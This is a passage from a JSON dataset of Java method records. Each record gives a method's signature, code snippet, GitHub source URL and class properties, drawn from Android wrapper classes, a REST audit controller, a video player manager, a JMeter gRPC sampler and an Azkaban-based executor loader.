java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31531, "method_name": "monodroidAddReference", "class_name": "AHorizontalScrollView", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31532, "method_name": "monodroidClearReferences", "class_name": "AHorizontalScrollView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/AHorizontalScrollView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 31533, "method_name": "getAll", "class_name": "AuditResource", "params": ["Pageable"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<List>", "snippet": "    public ResponseEntity<List<AuditEvent>> getAll(Pageable pageable) {\n        Page<AuditEvent> page = auditEventService.findAll(pageable);\n        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(ServletUriComponentsBuilder.fromCurrentRequest(), page);\n        return new ResponseEntity<>(page.getContent(), headers, HttpStatus.OK);\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/web/rest/AuditResource.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31534, "method_name": "getByDates", "class_name": "AuditResource", "params": ["LocalDate", "LocalDate", "Pageable"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<List>", "snippet": "    public ResponseEntity<List<AuditEvent>> getByDates(\n        @RequestParam(value = \"fromDate\") LocalDate fromDate,\n        @RequestParam(value = \"toDate\") LocalDate toDate,\n        Pageable pageable\n    ) {\n        Instant from = fromDate.atStartOfDay(ZoneId.systemDefault()).toInstant();\n        Instant to = toDate.atStartOfDay(ZoneId.systemDefault()).plusDays(1).toInstant();\n\n        Page<AuditEvent> page = auditEventService.findByDates(from, to, pageable);\n        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(ServletUriComponentsBuilder.fromCurrentRequest(), page);\n        return new ResponseEntity<>(page.getContent(), headers, HttpStatus.OK);\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/web/rest/AuditResource.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31535, "method_name": "get", "class_name": "AuditResource", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<AuditEvent>", "snippet": "    public ResponseEntity<AuditEvent> get(@PathVariable Long id) {\n        return ResponseUtil.wrapOrNotFound(auditEventService.find(id));\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/web/rest/AuditResource.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31536, "method_name": "onAccuracyChanged", "class_name": "BarometerListener", "params": ["android", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onAccuracyChanged (android.hardware.Sensor p0, int p1)\n\t{\n\t\tn_onAccuracyChanged (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/BarometerListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31537, "method_name": "n_onAccuracyChanged", "class_name": "BarometerListener", "params": ["android", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onAccuracyChanged (android.hardware.Sensor p0, int p1);\n\n\n\tpublic void onSensorChanged (android.hardware.SensorEvent p0)\n\t{\n\t\tn_onSensorChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/BarometerListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31538, "method_name": "onSensorChanged", "class_name": "BarometerListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onSensorChanged (android.hardware.SensorEvent p0)\n\t{\n\t\tn_onSensorChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/BarometerListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31539, "method_name": "n_onSensorChanged", "class_name": "BarometerListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onSensorChanged (android.hardware.SensorEvent p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/BarometerListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31540, "method_name": "monodroidAddReference", "class_name": "BarometerListener", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/BarometerListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31541, "method_name": "monodroidClearReferences", "class_name": "BarometerListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/BarometerListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31542, "method_name": "instance", "class_name": "GSYExoVideoManager", "params": [], "throws": null, "modifiers": ["public", "static", "synchronized"], "return_type": "GSYExoVideoManager", "snippet": "    public static synchronized GSYExoVideoManager instance() {\n        if (videoManager == null) {\n            videoManager = new GSYExoVideoManager();\n        }\n        return videoManager;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31543, "method_name": "getPlayManager", "class_name": "GSYExoVideoManager", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "IPlayerManager", "snippet": "    protected IPlayerManager getPlayManager() {\n        return new GSYExoPlayerManager();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31544, "method_name": "prepare", "class_name": "GSYExoVideoManager", "params": ["List<String>", "Map<String,String>", "boolean", "float", "boolean", "File", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void prepare(List<String> urls, Map<String, String> mapHeadData, boolean loop, float speed, boolean cache, File cachePath, String overrideExtension) {\n        if (urls.size() == 0) return;\n        Message msg = new Message();\n        msg.what = HANDLER_PREPARE;\n        msg.obj = new GSYExoModel(urls, mapHeadData, loop, speed, cache, cachePath, overrideExtension);\n        sendMessage(msg);\n        if (needTimeOutOther) {\n            startTimeOutBuffer();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31545, "method_name": "previous", "class_name": "GSYExoVideoManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void previous() {\n        if (playerManager == null) {\n            return;\n        }\n        ((GSYExoPlayerManager)playerManager).previous();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31546, "method_name": "next", "class_name": "GSYExoVideoManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void next() {\n        if (playerManager == null) {\n            return;\n        }\n        ((GSYExoPlayerManager)playerManager).next();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31547, "method_name": "backFromWindowFull", "class_name": "GSYExoVideoManager", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean backFromWindowFull(Context context) {\n        boolean backFrom = false;\n        ViewGroup vp = (ViewGroup) (CommonUtil.scanForActivity(context)).findViewById(Window.ID_ANDROID_CONTENT);\n        View oldF = vp.findViewById(FULLSCREEN_ID);\n        if (oldF != null) {\n            backFrom = true;\n            hideNavKey(context);\n            if (GSYExoVideoManager.instance().lastListener() != null) {\n                GSYExoVideoManager.instance().lastListener().onBackFullscreen();\n            }\n        }\n        return backFrom;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31548, "method_name": "releaseAllVideos", "class_name": "GSYExoVideoManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void releaseAllVideos() {\n        if (GSYExoVideoManager.instance().listener() != null) {\n            GSYExoVideoManager.instance().listener().onCompletion();\n        }\n        GSYExoVideoManager.instance().releaseMediaPlayer();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31549, "method_name": "onPause", "class_name": "GSYExoVideoManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onPause() {\n        if (GSYExoVideoManager.instance().listener() != null) {\n            GSYExoVideoManager.instance().listener().onVideoPause();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31550, "method_name": "onResume", "class_name": "GSYExoVideoManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onResume() {\n        if (GSYExoVideoManager.instance().listener() != null) {\n            GSYExoVideoManager.instance().listener().onVideoResume();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31551, "method_name": "onResume", "class_name": "GSYExoVideoManager", "params": ["boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void onResume(boolean seek) {\n        if (GSYExoVideoManager.instance().listener() != null) {\n            GSYExoVideoManager.instance().listener().onVideoResume(seek);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31552, "method_name": "isFullState", "class_name": "GSYExoVideoManager", "params": ["Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isFullState(Activity activity) {\n        ViewGroup vp = (ViewGroup) (CommonUtil.scanForActivity(activity)).findViewById(Window.ID_ANDROID_CONTENT);\n        final View full = vp.findViewById(FULLSCREEN_ID);\n        GSYVideoPlayer gsyVideoPlayer = null;\n        if (full != null) {\n            gsyVideoPlayer = (GSYVideoPlayer) full;\n        }\n        return gsyVideoPlayer != null;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExoVideoManager.java", "stars": "2", "class_props": {"extends": "GSYVideoBaseManager", "implements": null, "modifiers": ["public"]}}, {"id": 31553, "method_name": "init", "class_name": "GrpcRequest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {\n        clientCaller = new ClientCaller(HOST_PORT, PROTO_FOLDER, FULL_METHOD);\n    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/testbean/GrpcRequest.java", "stars": "3", "class_props": {"extends": "AbstractSampler", "implements": ["TestBean"], "modifiers": ["public"]}}, {"id": 31554, "method_name": "sample", "class_name": "GrpcRequest", "params": ["Entry"], "throws": null, "modifiers": ["public"], "return_type": "SampleResult", "snippet": "    public SampleResult sample(Entry ignored) {\n        if (Objects.isNull(clientCaller))\n            init();\n\n        SampleResult res = new SampleResult();\n        res.setSampleLabel(getName());\n        String req = clientCaller.buildRequest(REQUEST_FILE, REQUEST_JSON);\n        res.setSamplerData(req);\n        res.sampleStart();\n        try {\n            DynamicMessage resp = clientCaller.call(DEADLINE);\n\n            res.sampleEnd();\n            res.setSuccessful(true);\n            res.setResponseData(resp.toString().getBytes());\n            res.setResponseMessage(\"Success\");\n            res.setResponseCodeOK();\n        } catch (StatusRuntimeException e) {\n            res.sampleEnd();\n            res.setSuccessful(false);\n            res.setResponseMessage(\"Exception: \" + e.getStatus().getCode().name());\n            res.setResponseData(e.getMessage().getBytes());\n            res.setDataType(SampleResult.TEXT);\n            res.setResponseCode(\"500\");\n        }\n        return res;\n    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/testbean/GrpcRequest.java", "stars": "3", "class_props": {"extends": "AbstractSampler", "implements": ["TestBean"], "modifiers": ["public"]}}, {"id": 31555, "method_name": "applies", "class_name": "GrpcRequest", "params": ["ConfigTestElement"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean applies(ConfigTestElement configElement) {\n        String guiClass = configElement.getProperty(TestElement.GUI_CLASS).getStringValue();\n        return APPLIABLE_CONFIG_CLASSES.contains(guiClass);\n    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/testbean/GrpcRequest.java", "stars": "3", "class_props": {"extends": "AbstractSampler", "implements": ["TestBean"], "modifiers": ["public"]}}, {"id": 31556, "method_name": "setUp", "class_name": "JavaMethodsTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    // create an SqlSessionFactory\n    try (Reader reader = Resources\n      .getResourceAsReader(\"org/apache/ibatis/submitted/resolution/javamethods/mybatis-config.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n\n    // populate in-memory database\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n      \"org/apache/ibatis/submitted/resolution/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/resolution/javamethods/JavaMethodsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31557, "method_name": "shouldGetAUser", "class_name": "JavaMethodsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUser() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      MapperB mapper = sqlSession.getMapper(MapperB.class);\n      User user = mapper.getUser(1);\n      Assertions.assertEquals(Integer.valueOf(1), user.getId());\n      Assertions.assertEquals(\"User1\", user.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/resolution/javamethods/JavaMethodsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31558, "method_name": "getOperandString", "class_name": "XIM", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOperandString() {\n        switch (mode) {\n        case MODE_INDEXED:\n            return String.format(\"$%02x,X,#$%02x\", (operand & 0x00ff), ((operand & 0xff00) >> 8));\n        default:\n            return super.getOperandString();\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/XIM.java", "stars": "4", "class_props": {"extends": "NonBranchInstruction", "implements": null, "modifiers": ["public"]}}, {"id": 31559, "method_name": "uploadExecutableFlow", "class_name": "JdbcExecutorLoader", "params": ["ExecutableFlow"], "throws": ["ExecutorManagerException"], "modifiers": ["public", "synchronized"], "return_type": "void", "snippet": "  public synchronized void uploadExecutableFlow(final ExecutableFlow flow)\n      throws ExecutorManagerException {\n    this.executionFlowDao.uploadExecutableFlow(flow);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31560, "method_name": "updateExecutableFlow", "class_name": "JdbcExecutorLoader", "params": ["ExecutableFlow"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateExecutableFlow(final ExecutableFlow flow)\n      throws ExecutorManagerException {\n    this.executionFlowDao.updateExecutableFlow(flow);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31561, "method_name": "fetchExecutableFlow", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow fetchExecutableFlow(final int id)\n      throws ExecutorManagerException {\n    return this.executionFlowDao.fetchExecutableFlow(id);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31562, "method_name": "fetchQueuedFlows", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<Pair>", "snippet": "  public List<Pair<ExecutionReference, ExecutableFlow>> fetchQueuedFlows()\n      throws ExecutorManagerException {\n    return this.executionFlowDao.fetchQueuedFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31563, "method_name": "fetchRecentlyFinishedFlows", "class_name": "JdbcExecutorLoader", "params": ["Duration"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchRecentlyFinishedFlows(final Duration maxAge)\n      throws ExecutorManagerException {\n    return this.executionFlowDao.fetchRecentlyFinishedFlows(maxAge);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31564, "method_name": "fetchActiveFlows", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<Integer,Pair>", "snippet": "  public Map<Integer, Pair<ExecutionReference, ExecutableFlow>> fetchActiveFlows()\n      throws ExecutorManagerException {\n    return this.fetchActiveFlowDao.fetchActiveFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31565, "method_name": "fetchUnfinishedFlows", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<Integer,Pair>", "snippet": "  public Map<Integer, Pair<ExecutionReference, ExecutableFlow>> fetchUnfinishedFlows()\n      throws ExecutorManagerException {\n    return this.fetchActiveFlowDao.fetchUnfinishedFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31566, "method_name": "fetchAllUnfinishedFlows", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchAllUnfinishedFlows() throws ExecutorManagerException {\n    return this.fetchActiveFlowDao.fetchAllUnFinishFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31567, "method_name": "fetchUnfinishedFlowsMetadata", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<Integer,Pair>", "snippet": "  public Map<Integer, Pair<ExecutionReference, ExecutableFlow>> fetchUnfinishedFlowsMetadata()\n      throws ExecutorManagerException {\n    return this.fetchActiveFlowDao.fetchUnfinishedFlowsMetadata();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31568, "method_name": "fetchActiveFlowByExecId", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Pair<ExecutionReference,ExecutableFlow>", "snippet": "  public Pair<ExecutionReference, ExecutableFlow> fetchActiveFlowByExecId(final int execId)\n      throws ExecutorManagerException {\n    return this.fetchActiveFlowDao.fetchActiveFlowByExecId(execId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31569, "method_name": "fetchNumExecutableFlows", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int fetchNumExecutableFlows() throws ExecutorManagerException {\n    return this.numExecutionsDao.fetchNumExecutableFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31570, "method_name": "fetchNumExecutableFlows", "class_name": "JdbcExecutorLoader", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int fetchNumExecutableFlows(final int projectId, final String flowId)\n      throws ExecutorManagerException {\n    return this.numExecutionsDao.fetchNumExecutableFlows(projectId, flowId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31571, "method_name": "fetchNumExecutableNodes", "class_name": "JdbcExecutorLoader", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int fetchNumExecutableNodes(final int projectId, final String jobId)\n      throws ExecutorManagerException {\n    return this.numExecutionsDao.fetchNumExecutableNodes(projectId, jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31572, "method_name": "fetchFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchFlowHistory(final int projectId, final String flowId,\n      final int skip, final int num) throws ExecutorManagerException {\n    return this.executionFlowDao.fetchFlowHistory(projectId, flowId, skip, num);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31573, "method_name": "fetchFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "long"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchFlowHistory(final int projectId, final String flowId,\n      final long startTime) throws ExecutorManagerException {\n    return this.executionFlowDao.fetchFlowHistory(projectId, flowId, startTime);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31574, "method_name": "fetchFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int", "int", "Status"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchFlowHistory(final int projectId, final String flowId,\n      final int skip, final int num, final Status status) throws ExecutorManagerException {\n    return this.executionFlowDao.fetchFlowHistory(projectId, flowId, skip, num, status);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31575, "method_name": "fetchFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchFlowHistory(final int skip, final int num)\n      throws ExecutorManagerException {\n    return this.executionFlowDao.fetchFlowHistory(skip, num);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31576, "method_name": "fetchMaintainedFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["String", "List<Integer>", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchMaintainedFlowHistory(String username, List<Integer> projectIds, int skip, int size)\n          throws ExecutorManagerException {\n    return this.executionFlowDao.fetchMaintainedFlowHistory(username, projectIds, skip, size);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31577, "method_name": "fetchFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["String", "String", "String", "String", "String", "long", "long", "int", "int", "int"], "throws": 